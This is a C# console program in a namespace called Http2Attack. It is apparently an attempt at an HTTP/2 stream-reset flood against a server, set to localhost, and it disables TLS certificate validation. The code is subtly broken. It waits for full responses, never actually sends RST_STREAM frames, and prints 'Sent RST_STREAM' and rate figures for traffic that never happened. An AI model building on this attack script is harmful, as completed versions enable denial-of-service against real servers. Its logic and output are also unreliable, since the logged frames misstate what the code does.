using System;
using System.Net.Http;
using System.Threading.Tasks;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using System.Collections.Generic;

namespace Http2Attack
{
    class Program
    {
        private static uint streamCounter = 1;
        private static int sentHeaders = 0;
        private static int sentRSTs = 0;
        private static int recvFrames = 0;
        private static DateTime headerStart;
        private static DateTime headerEnd;
        private static object lockObject = new object();
        static async Task Main(string[] args)
        {
            Uri serverURL;
            if (!Uri.TryCreate("https://localhost:443", UriKind.Absolute, out serverURL))
            {
                Console.WriteLine("Invalid server URL.");
                return;
            }

            headerStart = DateTime.Now;

            var tlsConfig = new HttpClientHandler
            {
                ServerCertificateCustomValidationCallback = (sender, cert, chain, sslPolicyErrors) => true
            };

            var httpClient = new HttpClient(tlsConfig);

            var doneChan = new Channel<object>();

            for (int i = 0; i < 5; i++) // Adjust the number of requests as needed
            {
                await Task.Delay(0); // Ensure asynchronous context for asynchronous main
                _ = SendRequestAsync(httpClient, serverURL, 0, doneChan);
            }

            // Wait for all workers to finish
            for (int i = 0; i < 5; i++) // Adjust the number of requests as needed
            {
                await doneChan.ReadAsync();
            }

            headerEnd = DateTime.Now;

            PrintSummary();
        }

        static async Task SendRequestAsync(HttpClient httpClient, Uri serverURL, int delay, Channel<object> doneChan)
        {
            try
            {
                uint streamID;
                lock (lockObject)
                {
                    streamID = streamCounter += 2;
                }

                var request = new HttpRequestMessage(HttpMethod.Get, serverURL);
                request.Version = new Version(2, 0);

                var response = await httpClient.SendAsync(request);

                Interlocked.Increment(ref sentHeaders);
                Console.WriteLine($"[{streamID}] Sent HEADERS on stream {streamID}");

                // Sleep for several ms before sending RST.STREAM
                await Task.Delay(delay);

                Interlocked.Increment(ref sentRSTs);
                Console.WriteLine($"[{streamID}] Sent RST_STREAM on stream {streamID}");

                await doneChan.WriteAsync(null);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
                await doneChan.WriteAsync(null);
            }
        }

        static void PrintSummary()
        {
            double elapsed = (headerEnd - headerStart).TotalSeconds;
            Console.WriteLine("\n--- Summary ---");
            Console.WriteLine($"Frames sent: HEADERS = {sentHeaders}, RST_STREAM = {sentRSTs}");
            Console.WriteLine($"Frames received: {recvFrames}");
            Console.WriteLine($"Total time: {elapsed:F2} seconds ({Math.Round(sentHeaders / elapsed)} rps)\n");
        }
    }

    public class Channel<T>
    {
        private readonly object locker = new object();
        private readonly Queue<T> queue = new Queue<T>();
        private bool isCompleted;

        public async Task<bool> WriteAsync(T item)
        {
            lock (locker)
            {
                if (isCompleted)
                {
                    return false;
                }

                queue.Enqueue(item);
                Monitor.PulseAll(locker);
                return true;
            }
        }

        public async Task<T> ReadAsync()
        {
            lock (locker)
            {
                while (queue.Count == 0 && !isCompleted)
                {
                    Monitor.Wait(locker);
                }

                if (queue.Count > 0)
                {
                    return queue.Dequeue();
                }
                else
                {
                    return default;
                }
            }
        }

        public void Complete()
        {
            lock (locker)
            {
                isCompleted = true;
                Monitor.PulseAll(locker);
            }
        }
    }
}